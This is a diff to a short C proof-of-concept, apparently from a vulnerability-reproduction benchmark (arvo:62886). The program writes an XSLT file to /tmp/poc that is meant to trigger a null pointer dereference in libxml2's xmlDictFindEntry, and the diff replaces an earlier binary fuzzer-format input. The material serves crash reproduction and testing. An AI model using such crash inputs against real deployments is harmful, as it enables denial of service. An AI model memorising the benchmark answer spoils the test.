@@ -3,35 +3,23 @@
 #include <string.h>
 
 /* PoC for arvo:62886 */
-/* Triggers: null_pointer_dereference in xmlDictFindEntry */
+/* Triggers: null pointer dereference in xmlDictFindEntry via subdict->table */
 /* Vuln class: null_pointer_dereference */
+/* Target: /out/xpath - input is a single XML/XSLT document */
 
 int main(void) {
     FILE *f = fopen("/tmp/poc", "wb");
     if (!f) { perror("fopen"); return 1; }
     
-    /* Binary format: [4-byte maxAlloc BE][XPath + null][XML + null] */
-    
-    /* maxAllocs = 100 (big-endian) - allows subdict struct but not hash table */
-    fputc(0x00, f);
-    fputc(0x00, f);
-    fputc(0x00, f);
-    fputc(0x64, f);
-    
-    /* XPath expression: "//node()" + null terminator */
-    fputc('/', f);
-    fputc('/', f);
-    fputc('n', f);
-    fputc('o', f);
-    fputc('d', f);
-    fputc('e', f);
-    fputc('(', f);
-    fputc(')', f);
-    fputc(0x00, f);
-    
-    /* XML with DOCTYPE and internal entity to trigger subdict creation */
-    fprintf(f, "<!DOCTYPE root [<!ENTITY x \"y\">]><root>&x;</root>");
-    fputc(0x00, f);
+    /* Write a single valid XSLT stylesheet that triggers xmlDictCreateSub via import */
+    const char *xslt = 
+        "<?xml version=\"1.0\"?>"
+        "<xsl:stylesheet version=\"1.0\""
+        " xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">"
+        "<xsl:import href=\"dummy\"/>"
+        "<xsl:template match=\"/\"/>"
+        "</xsl:stylesheet>";
+    fwrite(xslt, 1, strlen(xslt), f);
     
     fclose(f);
     return 0;
